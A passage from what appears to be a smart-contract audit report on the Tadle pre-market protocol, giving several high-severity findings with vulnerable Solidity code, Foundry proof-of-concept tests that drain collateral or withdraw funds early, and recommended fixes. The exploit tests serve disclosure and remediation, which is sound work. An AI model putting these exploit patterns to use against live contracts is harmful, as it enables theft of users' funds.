        console2.log("usermockPointTokenAmount_PointToken:",usermockPointTokenAmount_PointToken);

        uint256 usermockUSDCTokenAmount_PointToken = tokenManager.userTokenBalanceMap(
            address(user),
            address(mockUSDCToken),
            TokenBalanceType.PointToken
        );
        console2.log("usermockUSDCTokenAmount_PointToke:",usermockUSDCTokenAmount_PointToken);
    }
    // [PASS] test_DeliveryPlace_settleAskTaker_addTokenBalance_error() (gas: 1116914)
    //     Logs:
    //     usermockPointTokenAmount_PointToken: 0
    //     usermockUSDCTokenAmount_PointToke: 10000000000000000000
```

The test logs will show that the `userTokenBalanceMap` was updated incorrectly.

### Code Snippet

<https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/DeliveryPlace.sol#L335-L433>

## Impact

The incorrect use of `makerInfo.tokenAddress` when updating the `TokenBalanceType.PointToken` balance in `userTokenBalanceMap` leads to a serious error

## Tools Used

Manual Review

## Recommendations

Please use `marketPlaceInfo.tokenAddress` when updating the balance for `TokenBalanceType.PointToken`:

```diff
    function settleAskTaker(address _stock, uint256 _settledPoints) external {
        IPerMarkets perMarkets = tadleFactory.getPerMarkets();
        StockInfo memory stockInfo = perMarkets.getStockInfo(_stock);


        (
            OfferInfo memory offerInfo,
            MakerInfo memory makerInfo,
            MarketPlaceInfo memory marketPlaceInfo,
            MarketPlaceStatus status
        ) = getOfferInfo(stockInfo.preOffer);

        // SNIP...


        uint256 settledPointTokenAmount = marketPlaceInfo.tokenPerPoint *
            _settledPoints;
        ITokenManager tokenManager = tadleFactory.getTokenManager();
        if (settledPointTokenAmount > 0) {
            tokenManager.tillIn(
                _msgSender(),
                marketPlaceInfo.tokenAddress,
                settledPointTokenAmount,
                true
            );


            tokenManager.addTokenBalance(
                TokenBalanceType.PointToken,
                offerInfo.authority,
-                makerInfo.tokenAddress,
+                marketPlaceInfo.tokenAddress,
                settledPointTokenAmount
            );
        }
        // SNIP...
    }
```

## <a id='H-09'></a>H-09. Token withdrawal fails until someone manually approves spending

_Submitted by [justawanderkid](https://profiles.cyfrin.io/u/justawanderkid), [danielwang8824](https://profiles.cyfrin.io/u/danielwang8824), [oxelmiguel](https://profiles.cyfrin.io/u/oxelmiguel), [p0wd3r](https://profiles.cyfrin.io/u/p0wd3r), [4rdiii](https://profiles.cyfrin.io/u/4rdiii), [izcoser](https://profiles.cyfrin.io/u/izcoser), [dustinhuel2](https://profiles.cyfrin.io/u/dustinhuel2), [0xaraj](https://profiles.cyfrin.io/u/0xaraj), [vladzaev](https://profiles.cyfrin.io/u/vladzaev), [schereo](https://profiles.cyfrin.io/u/schereo), [0xpep7](https://profiles.cyfrin.io/u/0xpep7), [eeyore](https://profiles.cyfrin.io/u/eeyore), [jennifersun](https://profiles.cyfrin.io/u/jennifersun), [vinica_boy](https://profiles.cyfrin.io/u/vinica_boy), [lazydog](https://profiles.cyfrin.io/u/lazydog), [irondevx](https://profiles.cyfrin.io/u/irondevx), [matejdb](https://profiles.cyfrin.io/u/matejdb), [MinhTriet](https://profiles.cyfrin.io/u/MinhTriet), [0xdarko](https://profiles.cyfrin.io/u/0xdarko), [jovemjeune](https://profiles.cyfrin.io/u/jovemjeune), [aksoy](https://profiles.cyfrin.io/u/aksoy), [wickie](https://profiles.cyfrin.io/u/wickie), [jesjupyter](https://profiles.cyfrin.io/u/jesjupyter), [tinnohofficial](https://profiles.cyfrin.io/u/tinnohofficial), [itsabinashb](https://profiles.cyfrin.io/u/itsabinashb), [pina](https://profiles.cyfrin.io/u/pina), [karanel](https://profiles.cyfrin.io/u/karanel), [ro1sharkm](https://profiles.cyfrin.io/u/ro1sharkm), [baz1ka](https://profiles.cyfrin.io/u/baz1ka), [x18a6](https://profiles.cyfrin.io/u/x18a6), [dinkras](https://profiles.cyfrin.io/u/dinkras), [0xsecuri](https://profiles.cyfrin.io/u/0xsecuri), [amaron](https://profiles.cyfrin.io/u/amaron), [tnevler](https://profiles.cyfrin.io/u/tnevler), [0xphantom](https://profiles.cyfrin.io/u/0xphantom), [shikhar229169](https://profiles.cyfrin.io/u/shikhar229169), [wellbyt3](https://profiles.cyfrin.io/u/wellbyt3), [bladesec](https://profiles.cyfrin.io/u/bladesec), [aresaudits](https://profiles.cyfrin.io/u/aresaudits), [kamensec](https://profiles.cyfrin.io/u/kamensec), [gkrastenov](https://profiles.cyfrin.io/u/gkrastenov), [Audittens](https://profiles.cyfrin.io/u/Audittens). Selected submission by: [izcoser](https://profiles.cyfrin.io/u/izcoser)._      
            


## Summary

The protocol uses a contract called TokenManager to control a capital pool that stores tokens.

When a user wants to withdraw, the TokenManager needs spender allowance on the capital pool, but this is not checked for, so the withdrawal fails.

## Vulnerability Details

We simulate a user creating an offer, closing it and then trying to withdraw. The withdrawal fails because of zero allowance for the TokenManager as a spender of the capital pool.

```Solidity
function test_token_withdrawal_fails() public {
    // Data for creating an offer, not relevant.
    uint256 points = 1000;
    uint256 amountToken = 1000000 * 1e18;
    uint256 collateralRate = 12000;
    uint256 eachTradeTax = 300;

    vm.startPrank(user);
    preMarktes.createOffer(
        CreateOfferParams(
            marketPlace,
            address(mockUSDCToken),
            points,
            amountToken,
            collateralRate,
            eachTradeTax,
            OfferType.Ask,
            OfferSettleType.Turbo
        )
    );

    // Close the offer.
    address offerAddr = GenerateAddress.generateOfferAddress(0);
    address stockAddr = GenerateAddress.generateStockAddress(0);

    preMarktes.closeOffer(stockAddr, offerAddr);

    tokenManager.withdraw(address(mockUSDCToken), TokenBalanceType.MakerRefund);
    vm.stopPrank();
}
```

> ```Solidity
> ├─ [8858] UpgradeableProxy::withdraw(MockERC20Token: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 4)
> │   ├─ [8339] TokenManager::withdraw(MockERC20Token: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 4) [delegatecall]
> │   │   ├─ [534] TadleFactory::relatedContracts(4) [staticcall]
> │   │   │   └─ ← [Return] UpgradeableProxy: [0x76006C4471fb6aDd17728e9c9c8B67d5AF06cDA0]
> │   │   ├─ [2959] MockERC20Token::transferFrom(UpgradeableProxy: [0x76006C4471fb6aDd17728e9c9c8B67d5AF06cDA0], 0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf, 1200000000000000000000000 [1.2e24])
> │   │   │   └─ ← [Revert] ERC20InsufficientAllowance(0x6891e60906DEBeA401F670D74d01D117a3bEAD39, 0, 1200000000000000000000000 [1.2e24])
> │   │   └─ ← [Revert] TransferFailed()
> │   └─ ← [Revert] TransferFailed()
> └─ ← [Revert] TransferFailed()
> ```



## Impact

For every new token whitelisted into the protocol, users will be unable to withdraw them until somebody calls \`\`capitalPool.approve(address(token))\`\`\`. **Because there's a disruption of protocol functionality**, I am reporting this as MEDIUM.

When someone calls the approve, TokenManager gets an allowance of uint.MAX on one of the capital pool's tokens, which means it withdrawals should work for the foreseeable future.

## Tools Used

Forge.

## Recommendations

In TokenManager::withdraw, line 175, before the safe transfer from call, check and add allowance if necessary:

```Solidity
if (IERC20(_tokenAddress).allowance(capitalPoolAddr, address(this)) == 0x0) {
        ICapitalPool(capitalPoolAddr).approve(_tokenAddress);
}
```

By doing that, the withdrawal no longer fails:

```Solidity
[PASS] test_token_withdrawal_fails() (gas: 612289)
```

## <a id='H-10'></a>H-10. [H-4] The function `PreMarkets::listOffer` charges an incorrect collateral amount, allowing users to manipulating collateral rates and drain the protocol's funds

_Submitted by [auditweiler](https://profiles.cyfrin.io/u/auditweiler), [p0wd3r](https://profiles.cyfrin.io/u/p0wd3r), [0xaraj](https://profiles.cyfrin.io/u/0xaraj), [danielarmstrong](https://profiles.cyfrin.io/u/danielarmstrong), [0xlrivo](https://profiles.cyfrin.io/u/0xlrivo), [eeyore](https://profiles.cyfrin.io/u/eeyore), [jennifersun](https://profiles.cyfrin.io/u/jennifersun), [ke1cam](https://profiles.cyfrin.io/u/ke1cam), [0xHunter](https://profiles.cyfrin.io/u/0xHunter), [cryptomoon](https://profiles.cyfrin.io/u/cryptomoon), [meeve](https://profiles.cyfrin.io/u/meeve), [0xgenaudits](https://profiles.cyfrin.io/u/0xgenaudits), [0xaman](https://profiles.cyfrin.io/u/0xaman), [anonymousjoe](https://profiles.cyfrin.io/u/anonymousjoe), [VaRuN](https://profiles.cyfrin.io/u/VaRuN), [amaron](https://profiles.cyfrin.io/u/amaron), [0xrststn](https://profiles.cyfrin.io/u/0xrststn), [0xphantom](https://profiles.cyfrin.io/u/0xphantom), [bladesec](https://profiles.cyfrin.io/u/bladesec), [philbugcatcher](https://profiles.cyfrin.io/u/philbugcatcher), [kupiasec](https://profiles.cyfrin.io/u/kupiasec), [honour](https://profiles.cyfrin.io/u/honour), [warrior](https://profiles.cyfrin.io/u/warrior), [0xb0k0](https://profiles.cyfrin.io/u/0xb0k0). Selected submission by: [philbugcatcher](https://profiles.cyfrin.io/u/philbugcatcher)._      
            


## Summary
The current collateral management system allows a malicious actor to drain the collateral pool by manipulating collateral rates. The issue arises because the collateral deposit charged at the time of listing a non-original offer corresponds to the previously set collateral rate, while the refund upon closing the offer is calculated based on the collateral rate registered on the offer. This discrepancy allows an attacker to exploit the system by manipulating collateral rates.

## Vulnerability Details
When a user lists an offer with `PreMarkets::listOffer`, they choose a collateral rate, which gets set on their offer. However, in the current implementation, the collateral deposit they are charged is based on the previous collateral rate rather than the rate they selected, according to the code snippets below:

```Solidity
        /// @dev transfer collateral when offer settle type is protected
        if (makerInfo.offerSettleType == OfferSettleType.Protected) {
            uint256 transferAmount = OfferLibraries.getDepositAmount(
                offerInfo.offerType,
@>              offerInfo.collateralRate,
                _amount,
                true,
                Math.Rounding.Ceil
            );
```

However, the collateral rate that is set on their offer info is the rate they selected:

```Solidity
        /// @dev update offer info
        offerInfoMap[offerAddr] = OfferInfo({
            id: stockInfo.id,
            authority: _msgSender(),
            maker: offerInfo.maker,
            offerStatus: OfferStatus.Virgin,
            offerType: offerInfo.offerType,
            abortOfferStatus: AbortOfferStatus.Initialized,
            points: stockInfo.points,
            amount: _amount,
@>          collateralRate: _collateralRate,
            usedPoints: 0,
            tradeTax: 0,
            settledPoints: 0,
            settledPointTokenAmount: 0,
            settledCollateralAmount: 0
        });
```

On `PreMarkets::closeOffer`, the collateral is refunded upon the cancelation of an order based on the collateral rate that is set on the offer:

```Solidity
            uint256 refundAmount = OfferLibraries.getRefundAmount(
                offerInfo.offerType,
                offerInfo.amount,
                offerInfo.points,
                offerInfo.usedPoints,
@>              offerInfo.collateralRate
            );
```

This creates an opportunity for a malicious actor to exploit the system:

1. The attacker takes an existing offer with a low collateral rate.
2. The attacker then lists the offer with a significantly higher collateral rate.
3. Upon canceling the listing, the attacker receives a refund based on the inflated collateral rate, effectively withdrawing more funds than they deposited.

## Impact

This exploit can lead to all of the protocol's funds being drained.

The impact - user withdrawing more collateral funds than they deposited - is demonstrated in the test case below, which can be included in the PreMarkets.t.sol file:

<details>
<summary>Proof Of Code</summary>

```Solidity
    function testStealCollateralWithCollateralRate() public {
        address maker = vm.addr(777); // user created to simulate an existing offer
        address thief = vm.addr(779); // user created to simulate the exploit (thief)

        // setup of the exploit demonstration
        uint256 STARTING_BALANCE = 100e18;

        uint256 POINTS_AMOUNT = 1_000;
        uint256 TOKEN_AMOUNT = 10e18;
        uint256 COLLATERAL_RATE = 15_000;
        uint256 EACH_TRADE_TAX = 1_000;

        uint256 POINTS_AMOUNT_THIEF = 10;
        uint256 TOKEN_AMOUNT_THIEF = 0.3e18;
        uint256 COLLATERAL_RATE_THIEF = 500_000; // collateral rate set by thief must be higher than original collateral rate

        deal(address(mockUSDCToken), maker, STARTING_BALANCE);
        deal(address(mockUSDCToken), thief, STARTING_BALANCE);

        vm.prank(maker);
        mockUSDCToken.approve(address(tokenManager), type(uint256).max);
        vm.prank(thief);
        mockUSDCToken.approve(address(tokenManager), type(uint256).max);

        vm.prank(address(capitalPool));
        mockUSDCToken.approve(address(tokenManager), type(uint256).max);

        // maker creates an offer
        vm.prank(maker);
        preMarktes.createOffer(
            CreateOfferParams(
                marketPlace,
                address(mockUSDCToken),
                POINTS_AMOUNT,
                TOKEN_AMOUNT,
                COLLATERAL_RATE,
                EACH_TRADE_TAX,
                OfferType.Ask,
                OfferSettleType.Protected
            )
        );

        address offer0Addr = GenerateAddress.generateOfferAddress(0);
        address stock1Addr = GenerateAddress.generateStockAddress(1);
        address offer1Addr = GenerateAddress.generateOfferAddress(1);

        vm.startPrank(thief);
        // thief takes offer created by the maker
        preMarktes.createTaker(offer0Addr, POINTS_AMOUNT_THIEF);
        // then they list the offer with a much higher collateral rate
        preMarktes.listOffer(
            stock1Addr,
            TOKEN_AMOUNT_THIEF,
            COLLATERAL_RATE_THIEF
        );
        // then they close the offer to get the refund
        preMarktes.closeOffer(stock1Addr, offer1Addr);
        tokenManager.withdraw(
            address(mockUSDCToken),
            TokenBalanceType.MakerRefund
        );

        // the amount the thief deposits is based on the original collateral rate
        uint256 collateralDepositedByThief = TOKEN_AMOUNT_THIEF.mulDiv(
            COLLATERAL_RATE,
            COLLATERAL_RATE_DECIMAL_SCALER
        );
        // the amount the thief deposits is based on the inflated collateral rate
        uint256 collateralWithdrawnByThief = TOKEN_AMOUNT_THIEF.mulDiv(
            COLLATERAL_RATE_THIEF,
            COLLATERAL_RATE_DECIMAL_SCALER
        );

        assert(collateralWithdrawnByThief > collateralDepositedByThief);
    }
```
</details>

## Tools Used
Manual code review.

## Recommendations

This vulnerability can be addressed by updating the `PreMarkets::listOffer` function to charge the user the collateral rate they define instead of the original collateral rate, as shown below:

```Diff
        if (makerInfo.offerSettleType == OfferSettleType.Protected) {
            uint256 transferAmount = OfferLibraries.getDepositAmount(
                offerInfo.offerType,
+               _collateralRate,
-               offerInfo.collateralRate,
                _amount,
                true,
                Math.Rounding.Ceil
            );
```

## <a id='H-11'></a>H-11. listOffer maker can settle offer via settleAskMaker() in Turbo settle type.

_Submitted by [eeyore](https://profiles.cyfrin.io/u/eeyore), [jennifersun](https://profiles.cyfrin.io/u/jennifersun), [touthang](https://profiles.cyfrin.io/u/touthang), [charlescheerful](https://profiles.cyfrin.io/u/charlescheerful), [0xbrivan2](https://profiles.cyfrin.io/u/0xbrivan2), [radin100](https://profiles.cyfrin.io/u/radin100), [meeve](https://profiles.cyfrin.io/u/meeve), [cryptomoon](https://profiles.cyfrin.io/u/cryptomoon), [0xaraj](https://profiles.cyfrin.io/u/0xaraj), [anonymousjoe](https://profiles.cyfrin.io/u/anonymousjoe), [VaRuN](https://profiles.cyfrin.io/u/VaRuN), [honour](https://profiles.cyfrin.io/u/honour), [pascal](https://profiles.cyfrin.io/u/pascal), [kupiasec](https://profiles.cyfrin.io/u/kupiasec), [0x1912](https://profiles.cyfrin.io/u/0x1912). Selected submission by: [jennifersun](https://profiles.cyfrin.io/u/jennifersun)._      
            


## Summary

In turbo settle type, the maker is the only person who deposit some collaterals. So the maker should be the only person who can settle ask maker and get back the collateral. But now the listOffer's owner can trigger settleAskMaker() to settle and get back some collateral. This will lead that the maker cannot get back all collaterals.

## Vulnerability Details

In Turbo settle type, the maker will add some collateral to create one ask offer. Traders can bid this offer to buy some points. And these takers can resell their points bought from the maker via listOffer() with 0 collateral because of the turbo mode.
When the market's status is changed to asksettle, the maker will settle this to get back the collateral via `settleAskMaker()`. All takers who still hold some points can get the point token via `closeBidTaker()`.
The problem exists in `settleAskMaker()`. One resell offer(via listOffer())'s owner can still settle this offer to get some collateral via `settleAskMaker()` in turbo mode. And these collateral belongs to the maker, the original offer owner. This will lead the maker lose some collateral.

One possible attack vector:

1. Alice creates one ask offer as the maker, deposit 10000 collateral token to sell 1000 points.
2. Bob creates one taker to buy 500 points via Alice's offer.
3. Bob resell his points via `listOffer()`.
4. Cathy create one taker to match the bob's offer.
5. MarketPlace's status is changes to asksettle.
6. Bob call `settleAskMaker()` to settle his offer to get some collaterals. Bob withdraws the collateral from the TokenManager.
7. Alice calls `settleAskMaker()` to settle her offer to get back all collaterals. Although the account's balance is updated in `userTokenBalanceMap`. But maybe there is not enough collateral token in capitalPool to withdraw.

```solidity
    function settleAskMaker(address _offer, uint256 _settledPoints) external {
        (
            OfferInfo memory offerInfo,
            MakerInfo memory makerInfo,
            MarketPlaceInfo memory marketPlaceInfo,
            MarketPlaceStatus status
        ) = getOfferInfo(_offer);
        // The maker has already selled `usedPoints`.
        if (_settledPoints > offerInfo.usedPoints) {
            revert InvalidPoints();
        }
        // fixedratio does not support settle in this contract.
        if (marketPlaceInfo.fixedratio) {
            revert FixedRatioUnsupported();
        }
        // 
        if (offerInfo.offerType == OfferType.Bid) {
            revert InvalidOfferType(OfferType.Ask, OfferType.Bid);
        }

        if (
            offerInfo.offerStatus != OfferStatus.Virgin &&
            offerInfo.offerStatus != OfferStatus.Canceled
        ) {
            revert InvalidOfferStatus();
        }

        if (status == MarketPlaceStatus.AskSettling) {
            if (_msgSender() != offerInfo.authority) {
                revert Errors.Unauthorized();
            }
        } else {
            if (_msgSender() != owner()) {
                revert Errors.Unauthorized();
            }
            if (_settledPoints > 0) {
                revert InvalidPoints();
            }
        }
        // Calculate the token amount
        uint256 settledPointTokenAmount = marketPlaceInfo.tokenPerPoint *
            _settledPoints;

        ITokenManager tokenManager = tadleFactory.getTokenManager();
        if (settledPointTokenAmount > 0) {
            tokenManager.tillIn(
                _msgSender(),
                marketPlaceInfo.tokenAddress,
                settledPointTokenAmount,
                true
            );
        }

        uint256 makerRefundAmount;
        // The maker can receive their collateral if they pay enough point token.
        if (_settledPoints == offerInfo.usedPoints) {
            if (offerInfo.offerStatus == OfferStatus.Virgin) {
                makerRefundAmount = OfferLibraries.getDepositAmount(
                    offerInfo.offerType,
                    offerInfo.collateralRate,
                    offerInfo.amount,
                    true,
                    Math.Rounding.Floor
                );
            } else {
                uint256 usedAmount = offerInfo.amount.mulDiv(
                    offerInfo.usedPoints,
                    offerInfo.points,
                    Math.Rounding.Floor
                );

                makerRefundAmount = OfferLibraries.getDepositAmount(
                    offerInfo.offerType,
                    offerInfo.collateralRate,
                    usedAmount,
                    true,
                    Math.Rounding.Floor
                );
            }

            tokenManager.addTokenBalance(
                // @audit-fp [L] improper balance type
                TokenBalanceType.SalesRevenue,
                _msgSender(),
                makerInfo.tokenAddress,
                makerRefundAmount
            );
        }

        IPerMarkets perMarkets = tadleFactory.getPerMarkets();
        perMarkets.settledAskOffer(
            _offer,
            _settledPoints,
            settledPointTokenAmount
        );
......
    }
```

### Poc

In below test case, user2 is not the maker, users buy points and resell points. When the markerplace's status is changed to the asksettle status, users can settle his offer to get back some collaterals.

```solidity
    function test_Poc_settle_ask_offer() public {
        vm.startPrank(user);
        
        preMarktes.createOffer(
            CreateOfferParams(
                marketPlace,
                address(mockUSDCToken),
                1000,
                0.01 * 1e18,
                12000,
                300,
                OfferType.Ask,
                OfferSettleType.Turbo
            )
        );
        vm.stopPrank();
        vm.startPrank(user2);
        address offerAddr = GenerateAddress.generateOfferAddress(0);
        preMarktes.createTaker(offerAddr, 500);

        address stock1Addr = GenerateAddress.generateStockAddress(1);
        preMarktes.listOffer(stock1Addr, 0.006 * 1e18, 12000);
        address offer1Addr = GenerateAddress.generateOfferAddress(1);
        //preMarktes.closeOffer(stock1Addr, offer1Addr);
        //preMarktes.relistOffer(stock1Addr, offer1Addr);

        vm.stopPrank();

        vm.startPrank(user1);
        preMarktes.createTaker(offer1Addr, 500);
        systemConfig.updateMarket(
            "Backpack",
            address(mockPointToken),
            0.01 * 1e18,
            block.timestamp - 1,
            3600
        );
        vm.stopPrank();
        vm.startPrank(user2);
        mockPointToken.approve(address(tokenManager), 10000 * 10 ** 18);
        deliveryPlace.settleAskMaker(offer1Addr, 500);
        vm.stopPrank();
        vm.startPrank(user);
        mockPointToken.approve(address(tokenManager), 10000 * 10 ** 18);
        deliveryPlace.settleAskMaker(offerAddr, 500);
        vm.stopPrank();
    }
```

## Impact

Maker's collateral will be withdrawn by others. Makers may have to take the loss.

## Tools Used

Manual

## Recommendations

In turbo mode, only the maker or the original offer's owner can trigger `settleAskMaker()`

## <a id='H-12'></a>H-12. Fund Withdrawal Flaw in preMarket Allows Users to Avoid Settlement Obligations

_Submitted by [wellbyt3](https://profiles.cyfrin.io/u/wellbyt3), [Tomas0707](https://profiles.cyfrin.io/u/Tomas0707), [joicygiore](https://profiles.cyfrin.io/u/joicygiore), [eeyore](https://profiles.cyfrin.io/u/eeyore), [h2134](https://profiles.cyfrin.io/u/h2134), [oxelmiguel](https://profiles.cyfrin.io/u/oxelmiguel), [0xnbvc](https://profiles.cyfrin.io/u/0xnbvc), [emanherawy](https://profiles.cyfrin.io/u/emanherawy), [meeve](https://profiles.cyfrin.io/u/meeve), [anonymousjoe](https://profiles.cyfrin.io/u/anonymousjoe), [krisrenzo](https://profiles.cyfrin.io/u/krisrenzo), [kamensec](https://profiles.cyfrin.io/u/kamensec), [amaron](https://profiles.cyfrin.io/u/amaron), [bladesec](https://profiles.cyfrin.io/u/bladesec), [_frolic](https://profiles.cyfrin.io/u/_frolic), [gkrastenov](https://profiles.cyfrin.io/u/gkrastenov). Selected submission by: [oxelmiguel](https://profiles.cyfrin.io/u/oxelmiguel)._      
            


## Summary

The goal of the protocol is to facilitate pre-market trading by allowing sellers to list points at their desired prices and enabling buyers to purchase these assets before their official launch. After the Token Generation Event (TGE), sellers are required to deliver the corresponding tokens to buyers at the pre-listed prices, ensuring that pre-market agreements are honored and enhancing overall market liquidity.

<https://tadle.gitbook.io/tadle/how-tadle-works/features-and-terminologies/settlement-and-collateral-rate>

* Sellers will receive their initial collateral back along with the buyer's funds only after completing the settlement.

* Buyers will receive the equivalent tokens, and their funds will be transferred to the sellers.

* If sellers fail to complete the settlement within the allotted time, they will forfeit their collateral.

* Buyers can claim compensation from the seller’s collateral as stored in the smart contract.

## Vulnerabilities details

The protocol currently allows sellers to withdraw buyer’s funds and tax fees before completing the settlement, which can lead to sellers avoiding their settlement obligations without losing their collateral, leaving buyers without compensation.

This issue arises because:

* When a buyer purchases points, the amount (salesRevenue) and tax fee become immediately available for withdrawal to seller.

The createTaker function processes the deposit and tax fee transfer:

<https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/PreMarkets.sol#L164>

```solidity
function createTaker(address _offer, uint256 _points) external payable {
        /*
            ...
        */
        ITokenManager tokenManager = tadleFactory.getTokenManager();
        _depositTokenWhenCreateTaker(
            platformFee,
            depositAmount,
            tradeTax,
            makerInfo,
            offerInfo,
            tokenManager
        );

        /*
            ...
        */

        _updateTokenBalanceWhenCreateTaker(
            _offer,
            tradeTax,
            depositAmount,
            offerInfo,
            makerInfo,
            tokenManager
        );

        /*
            ...
        */
    }
```

* The \_depositTokenWhenCreateTaker function transfers funds from the buyer to the capital pool.

* The \_updateTokenBalanceWhenCreateTaker function then enables the seller to withdraw the trade tax and deposit amount:

<https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/PreMarkets.sol#L906>

```solidity
function _updateTokenBalanceWhenCreateTaker(
        address _offer,
        uint256 _tradeTax,
        uint256 _depositAmount,
        OfferInfo storage offerInfo,
        MakerInfo storage makerInfo,
        ITokenManager tokenManager
    ) internal {
        if (
            _offer == makerInfo.originOffer ||
            makerInfo.offerSettleType == OfferSettleType.Protected
        ) {
            tokenManager.addTokenBalance(
                TokenBalanceType.TaxIncome,
                offerInfo.authority,
                makerInfo.tokenAddress,
                _tradeTax
            );
        } else {
            tokenManager.addTokenBalance(
                TokenBalanceType.TaxIncome,
                makerInfo.authority,
                makerInfo.tokenAddress,
                _tradeTax
            );
        }

        /// @dev update sales revenue
        if (offerInfo.offerType == OfferType.Ask) {

            tokenManager.addTokenBalance(
                TokenBalanceType.SalesRevenue,
                offerInfo.authority,
                makerInfo.tokenAddress,
                _depositAmount
            );
        } else {
            tokenManager.addTokenBalance(
                TokenBalanceType.SalesRevenue,
                _msgSender(),
                makerInfo.tokenAddress,
                _depositAmount
            );
        }
    }
```

The ability for sellers to withdraw these funds before settlement means they can evade their obligations without any penalty, while buyers may not receive the tokens they paid for.

## Proof of concept

Scenario 1

1. Alice Creates an Ask Offer in Turbo Mode:

* Collateral: 10,000 USDC
* Points Listed: 1,000
* collateral rate : 10\_000 (so alice deposit exactly 10 000 usdc)

1. Bob Purchases Points:

* Points Bought: 500
* Collateral Reserved: 5,000 USDC

1. Dany Purchases Points:

* Points Bought: 500
* Collateral Reserved: 5,000 USDC

1. Alice Withdraws Funds:

* Amount Withdrawn: 10,000 USDC + 300 USCD (taxFee)

1. Post-TGE Obligation :

* Alice Must Settle: 500 points for Bob and 500 points for Dany.

Issue: If the value of 1,000 points in PointToken increases to 15,000 USDC after the TGE, Alice might choose not to settle her obligations. Having already withdrawn 10,300 USDC, she faces no penalty for failing to deliver the tokens and gains an additional 300 USDC. Meanwhile, Bob and Dany would not receive the tokens they paid for, and they would lose their tax fee and any potential compensation. This undermines the protocol’s integrity and leaves buyers unprotected.

* working test case

```solidity
function test_ask_custom() public {
        
        //create the three user and deal then usdc
        address alice = vm.addr(10);
        address bob = vm.addr(11);
        address dany = vm.addr(12);

        deal(address(mockUSDCToken), alice, 10000 );
        deal(address(mockUSDCToken), bob, 100000 );
        deal(address(mockUSDCToken), dany, 100000 );

        // alice create an ask offer
        vm.startPrank(alice);
        mockUSDCToken.approve(address(tokenManager), type(uint256).max);
        preMarktes.createOffer(
            CreateOfferParams(
                marketPlace,
                address(mockUSDCToken),
                1000,
                10000,
                10000,
                300,
                OfferType.Ask,
                OfferSettleType.Turbo
            )
        );
        address aliceOffr = GenerateAddress.generateOfferAddress(0);
        address aliceStock = GenerateAddress.generateStockAddress(0);
        vm.stopPrank();

        // bob buy 500 point
        vm.startPrank(bob);
        mockUSDCToken.approve(address(tokenManager), type(uint256).max);
        preMarktes.createTaker(aliceOffr, 500);
        address bobStock = GenerateAddress.generateStockAddress(1);
        vm.stopPrank();

        // dany buy 500 point
        vm.startPrank(dany);
        mockUSDCToken.approve(address(tokenManager), type(uint256).max);
        preMarktes.createTaker(aliceOffr, 500);
        address danyStock = GenerateAddress.generateStockAddress(2);
        vm.stopPrank();

        // alice call wthdraw and get salesRevenue an TaxIncome before settlement
        vm.startPrank(alice);
        tokenManager.withdraw(address(mockUSDCToken), TokenBalanceType.SalesRevenue);
        tokenManager.withdraw(address(mockUSDCToken), TokenBalanceType.TaxIncome);
        vm.stopPrank();
        assertEq(mockUSDCToken.balanceOf(alice),10300);

    }
```

Scenario 2

1. Alice Creates an Bid Offer in Turbo Mode:

* Collateral: 10,000 USDC
* Points Listed: 1,000

1. Bob Sell Points to alice :

* Points sold: 1 000
* Collateral Reserved: 10 000 USDC

1. Bob Withdraws Funds:

* Amount Withdrawn: 10,000 USDC

## Impact

The ability for sellers to withdraw buyer's funds and tax fees before completing the settlement poses a significant risk to the integrity of the Tadle protocol. This vulnerability allows sellers to evade their settlement obligations, leaving buyers without the tokens they paid for and without any form of compensation. This not only compromises the trustworthiness of the platform but also deters potential participants, reducing market liquidity and participation.

## Recommendations

Restrict Withdrawal Before Settlement: Modify the smart contract to prevent sellers from withdrawing any funds, including the sales revenue and collateral, before they have successfully completed their settlement obligations or they aborted or canceled their offer.

example

* Implement a new mapping and adjust the addTokenBalance function as follows :

```solidity
function addTokenBalance(
        TokenBalanceType _tokenBalanceType,
        address _accountAddress,
        address _tokenAddress,
        uint256 _amount,
        bool withdrawAllow
    ) external onlyRelatedContracts(tadleFactory, _msgSender()) {
        userTokenBalanceMap[_accountAddress][_tokenAddress][
            _tokenBalanceType
        ] += _amount;

        withdrawAllowMap[_accountAddress][_tokenAddress][
            _tokenBalanceType
        ] = withdrawAllow;

        emit AddTokenBalance(
            _accountAddress,
            _tokenAddress,
            _tokenBalanceType,
            _amount,
            withdrawAllow
        );
    }
```

* In the withdraw function, add a check to enforce this restriction:

```Solidity
    bool withdrawAllow = withdrawAllowMap[_msgSender()][
            _tokenAddress
        ][_tokenBalanceType];

        if (!withdrawAllow) {
            revert Errors.Unauthorized();
        }
```

Update the withdrawAllowMap in the settlement function to allow users to withdraw their funds only after fulfilling their obligations. If a user fails to settle, they should be prevented from withdrawing any funds they are not allow to.


## <a id='H-13'></a>H-13. Missing abort status check allows bid taker to steal users funds

_Submitted by [touthang](https://profiles.cyfrin.io/u/touthang), [fyamf](https://profiles.cyfrin.io/u/fyamf), [radin100](https://profiles.cyfrin.io/u/radin100), [eeyore](https://profiles.cyfrin.io/u/eeyore), [robertodf99](https://profiles.cyfrin.io/u/robertodf99), [inzinko](https://profiles.cyfrin.io/u/inzinko), [honour](https://profiles.cyfrin.io/u/honour), [stanchev](https://profiles.cyfrin.io/u/stanchev), [kupiasec](https://profiles.cyfrin.io/u/kupiasec), [azanux](https://profiles.cyfrin.io/u/azanux). Selected submission by: [robertodf99](https://profiles.cyfrin.io/u/robertodf99)._      
            


## Summary
When the ask makers abort offers their status is changed to `Settled` in function `PreMarkets::abortAskOffer`:

```javascript
offerInfo.abortOfferStatus = AbortOfferStatus.Aborted;
offerInfo.offerStatus = OfferStatus.Settled;
```
Therefore bid takers can close the bid offers by calling `DeliveryPlace::closeBidTaker` since the only offer status check is the following:

```javascript
if (offerInfo.offerStatus != OfferStatus.Settled) {
    revert InvalidOfferStatus();
}
```

If the ask maker has not settled the offer, the collateral corresponding to the points purchased by the bid taker will be sent as a penalty. However, since the collateral has already been returned (except for the portion representing the profit from the sale that belongs to the bid taker), the additional amount sent to the bid taker will be taken from another user.

```javascript
        uint256 collateralFee;
        if (offerInfo.usedPoints > offerInfo.settledPoints) {
            if (offerInfo.offerStatus == OfferStatus.Virgin) {
                collateralFee = OfferLibraries.getDepositAmount(
